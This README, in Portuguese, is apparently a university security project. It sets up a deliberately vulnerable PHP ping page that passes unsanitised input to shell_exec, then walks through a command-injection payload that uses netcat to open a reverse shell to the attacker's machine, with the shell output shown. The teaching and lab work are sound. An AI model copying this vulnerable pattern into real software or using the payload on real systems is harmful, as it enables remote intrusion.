# Projeto

## Grupo
- Fernando - nusp
- Matheus Baptistella - 11223117

## Fase 1
### Funcionamento
Para este projeto, o objetivo era desenvolver um servidor web Apache em PHP 5 que tivesse alguma vulnerabilidade que o grupo pudesse explorar para criar uma demonstração. Para isso, o grupo criou uma página na qual o usuário pode inserir um domínio e o site utiliza o comando `ping` para pingar o domínio, mostrando parte do output do comando na página web para o usuário saber que o comando está funcionando. O código PHP processa a entrada do usuário a partir do formulário HTML e executa a seguinte linha de código:
```php
shell_exec("ping -c 4 " . $ip);
```

Ou seja, ele cria um comando a partir do input do usuário e manda para a shell executar. Isto é uma vulnerabilidade, pois a shell está executando algo controlado pelo o usuário. Deste modo, o grupo decidiu demonstrar o Atatque de "Command Injection" no PHP para utilizar esta vulnerabilidade. O ataque consiste em explorar o input de usuário que não é sanitizado para executar algum comando malicioso. Neste caso, o grupo decidiu abrir uma conexão de shell reversa, isto é, ao invés do atacante se conectar ao servidor (bind), como no caso inicial da página web para efetuar o ping, o atacante cria um listener em sua máquina que fica esperando por uma conexão. Assim, ao incluir o comando malicioso no alvo (servidor), o servidor é quem faz a request para se conectar ao atacante. Desta forma, o atacante pode enviar comandos para serem executados na shell do servidor.

### Execução
Para simular o ataque, inicialmente deve-se ter instalado na máuina local o Docker/docker compose, e o Netcat. Assim, é necessário estar no diretório do projeto:
```bash
cd projeto
```
e então pode-se iniciar o servidor (vítima) com o comando:
```bash
docker compose up -d --build
```

Para visualizar o serviço web, acesse o endereço `http://localhost:8080`. Teste o funcionamento esperado da página colocando `google.com` no campo para inserir o IP. O output será mostrado na própria página. Após verificar o correto funcionamento do servidor, na sua máquina local crie um listener com o netcat através do comando:
```bash
nc -lvnp 4444
```
neste listener será conectada a shell reversa. De volta para a página web, podemos modificar o input do usuário de forma que o servidor execute o ping e depois execute um comando adicional. Para isso, podemos formular o payload:
```
google.com; nc <ip da máquina local> -e /bin/bash`
```
a primeira parte garante que o comando será válido, pois `ping` espera um endereço. Ao utilizar o caractere `;`, estamos instruindo a shell a executar o comando seguinte depois do ping. O próximo comando é utilizado para criar a conexão em shell reversa, ao utilizar o netcat para estabelecer uma conexão com o atacante na porta `4444` e executar uma shell `/bin/bash`. Assim, ao incluir o ip corretamente e submeter o formulário no serviço web, pode-se notar que no terminal do listener temos uma shell reversa:
```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on <address>
ls
index.php
whoami
www-data
pwd
/var/www/html
```